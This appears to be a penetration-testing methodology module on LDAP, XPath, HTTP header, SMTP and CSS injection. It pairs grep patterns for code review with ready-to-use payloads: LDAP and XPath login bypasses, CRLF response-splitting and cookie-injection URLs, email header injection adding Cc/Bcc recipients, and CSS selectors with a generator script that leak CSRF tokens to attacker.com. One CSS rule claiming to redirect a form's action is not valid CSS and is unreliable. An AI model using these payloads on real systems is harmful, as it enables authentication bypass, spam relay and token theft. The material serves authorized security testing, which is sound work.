# VULN MODULE — Other Injection Classes
# Covers: LDAP, XPath, HTTP Header, SMTP, CSS Injection
# Asset: webapp
# Report prefix: WEB-INJ

---

## LDAP INJECTION — CWE-90

### Whitebox
```bash
grep -rn "ldap_search\|LdapConnection\|DirectorySearcher\|openldap" \
  --include="*.php" --include="*.java" --include="*.py" --include="*.cs"
grep -rn "ldap://\|(\|)\|\*\|\\\\00" --include="*.php" --include="*.java"
```

### Payloads
```bash
# Auth bypass — if query is: (&(uid=INPUT)(password=INPUT))
# Inject: *)(uid=*))(|(uid=*
# Result: (&(uid=*)(uid=*))(|(uid=*)(password=INPUT)) → always true

username: *)(uid=*))(|(uid=*
password: anything

# Wildcard injection — enumerate usernames
username: a*
username: ad*
username: adm*
# True if any user starts with the prefix

# Null byte injection
username: admin\00
```

---

## XPATH INJECTION — CWE-643

### Whitebox
```bash
grep -rn "xpath\|XPath\|selectSingleNode\|selectNodes" \
  --include="*.php" --include="*.java" --include="*.py" --include="*.js"
```

### Payloads
```bash
# Auth bypass — if query is: //user[name/text()='INPUT' and password/text()='INPUT']
# Inject:
username: ' or '1'='1
password: ' or '1'='1
# Result: //user[name/text()='' or '1'='1' and password/text()='' or '1'='1']

# Extract data (blind)
username: ' or substring(name(/*[1]),1,1)='a' or '1'='2
# Binary search through node names
```

---

## HTTP HEADER INJECTION — CWE-113

### Whitebox
```bash
grep -rn "header(\|setHeader(\|Response\.addHeader" \
  --include="*.php" --include="*.java" --include="*.py" -A3 | \
  grep "\$_\(GET\|POST\|REQUEST\)\|req\.\|request\."
```

### Payloads
```bash
# CRLF injection (\r\n = %0d%0a) — inject arbitrary headers
# If Location header reflects input:
GET /redirect?url=https://target.com%0d%0aSet-Cookie:%20malicious=1

# Response splitting → cache poisoning
GET /page?lang=en%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK

# Cookie injection via header
GET /login?redirect=/%0d%0aSet-Cookie:%20admin=1

# In Burp: inject in User-Agent, Referer, X-Forwarded-For if reflected in response
```

---

## SMTP / EMAIL INJECTION — CWE-93

### Whitebox
```bash
grep -rn "mail(\|sendmail\|smtp\|PHPMailer\|nodemailer\|smtplib" \
  --include="*.php" --include="*.py" --include="*.js"
grep -rn "From:\|To:\|Subject:\|Cc:\|Bcc:" --include="*.php" --include="*.py"
# Check: is user input placed into email headers without sanitization?
```

### Payloads
```bash
# Inject additional recipients via header injection in To/Subject/From field
# In contact form "Your email" field:
attacker@evil.com%0aCc:victim1@target.com%0aBcc:victim2@target.com

# Subject injection
contact-form%0aSubject:%20SPAM%20MESSAGE%0a%0aBody%20here

# Full email injection via newline in name field:
First Name: "John\r\nCc: victim@target.com\r\n"
```

---

## CSS INJECTION — CWE-79 (variant)

### Threat
Injecting CSS into a page enables:
- Exfiltrating data via CSS attribute selectors + background-image requests
- Stealing CSRF tokens from HTML attributes
- UI redressing (moving/hiding elements)

### Payloads
```css
/* Data exfiltration via attribute selectors */
/* If <input name="csrf" value="SECRET"> exists on page: */
input[name="csrf"][value^="a"] { background: url(https://attacker.com/?c=a); }
input[name="csrf"][value^="b"] { background: url(https://attacker.com/?c=b); }
/* One rule per character → exfiltrate token character by character */

/* Automated with PoC generator: */
python3 -c "
import string
for c in string.ascii_lowercase + string.digits:
    print(f'input[name=\"csrf\"][value^=\"{c}\"]{{background:url(https://attacker.com/?c={c})}}')
"

/* Move login form to attacker-controlled endpoint */
form { action: url(https://attacker.com/steal); }
```

### Whitebox
```bash
grep -rn "style.*innerHTML\|\\.css\b.*user\|styleSheet.*user" \
  --include="*.js" --include="*.php"
# Look for user input reflected inside <style> tags or style attributes
```
